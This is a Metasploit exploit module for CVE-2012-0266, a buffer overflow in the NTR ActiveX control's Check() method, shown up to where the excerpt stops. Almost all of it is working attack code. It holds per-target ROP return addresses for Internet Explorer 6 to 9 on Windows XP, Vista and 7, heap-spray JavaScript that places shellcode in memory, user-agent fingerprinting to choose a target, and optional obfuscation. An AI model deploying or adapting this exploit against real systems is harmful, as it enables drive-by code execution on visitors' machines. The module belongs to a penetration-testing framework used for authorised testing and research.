##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "9.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :classid    => "{E6ACF817-0A85-4EBE-9F0A-096C6488CFEA}",
    :method     => "Check",
    :rank       => NormalRanking
  })


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NTR ActiveX Control Check() Method Buffer Overflow',
      'Description'    => %q{
          This module exploits a vulnerability found in NTR ActiveX 1.1.8. The
        vulnerability exists in the Check() method, due to the insecure usage of strcat to
        build a URL using the bstrParams parameter contents, which leads to code execution
        under the context of the user visiting a malicious web page. In order to bypass
        DEP and ASLR on Windows Vista and Windows 7 JRE 6 is needed.
      },
      'Author'         =>
        [
          'Carsten Eiram', # Vuln discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-0266' ],
          [ 'OSVDB', '78252' ],
          [ 'BID', '51374' ],
          [ 'URL', 'http://secunia.com/secunia_research/2012-1/' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space' => 956,
          'DisableNops' => true,
          'BadChars'    => "",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          # NTR ActiveX 1.1.8.0
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3',
            {
              'Rop' => nil,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x0c0c0c0c
            }
          ],
          [ 'IE 7 on Windows XP SP3',
            {
              'Rop' => nil,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x0c0c0c0c
            }
          ],
          [ 'IE 8 on Windows XP SP3',
            {
              'Rop' => :msvcrt,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x77c15ed5 # xchg eax, esp # ret # from msvcrt
            }
          ],
          [ 'IE 7 on Windows Vista',
            {
              'Rop' => nil,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x0c0c0c0c
            }
          ],
          [ 'IE 8 on Windows Vista',
            {
              'Rop' => :jre,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6
            }
          ],
          [ 'IE 8 on Windows 7',
            {
              'Rop' => :jre,
              'Offset' => '0x5f4',
              'Random' => false,
              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6
            }
          ],
          [ 'IE 9 on Windows 7',
            {
              'Rop' => :jre,
              'Offset' => '0x5fe',
              'Random' => true,
              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jan 11 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class
    )

    deregister_options('URIPATH')

  end

  #
  # Returns a random URI path which allows to reach the vulnerable code
  #
  def resource_uri
    path = random_uri
    path << random_uri
    return path
  end


  #
  # Generates a random URI for use with making finger printing more
  # challenging.
  #
  def random_uri
    "/" + Rex::Text.rand_text_alphanumeric(rand(10) + 6)
  end

  # Spray published by corelanc0d3r
  # Exploit writing tutorial part 11 : Heap Spraying Demystified
  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
  def get_random_spray(t, js_code, js_nops)

    spray = <<-JS

    function randomblock(blocksize)
    {
      var theblock = "";
      for (var i = 0; i < blocksize; i++)
      {
        theblock += Math.floor(Math.random()*90)+10;
      }
      return theblock;
    }

    function tounescape(block)
    {
      var blocklen = block.length;
      var unescapestr = "";
      for (var i = 0; i < blocklen-1; i=i+4)
      {
        unescapestr += "%u" + block.substring(i,i+4);
      }
      return unescapestr;
    }

    var heap_obj = new heapLib.ie(0x10000);

    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;

    var offset_length = #{t['Offset']};

    for (var i=0; i < 0x1000; i++) {
      var padding = unescape(tounescape(randomblock(0x1000)));
      while (padding.length < 0x1000) padding+= padding;
      var junk_offset = padding.substring(0, offset_length);
      var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
      heap_obj.alloc(sprayblock);
    }

    JS

    return spray
  end

  def get_spray(t, js_code, js_nops)

    spray = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;

    var offset = nops.substring(0, #{t['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();
    for (var z=1; z < 449; z++) {
      heap_obj.alloc(block);
    }

    JS

    return spray

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'
    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1] #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2] #IE 7 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
      return targets[3] #IE 7 on Windows XP SP3
    elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
      return targets[4] #IE 7 on Windows Vista SP2
    elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 8/
      return targets[5] #IE 7 on Windows Vista SP2
    elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8/
      return targets[6] #IE 7 on Windows 7 SP1
    elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 9/
      return targets[7] #IE 7 on Windows 7 SP1
    else
      return nil
    end
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V")[0].to_i
  end

  def nop
    return make_nops(4).unpack("V")[0].to_i
  end


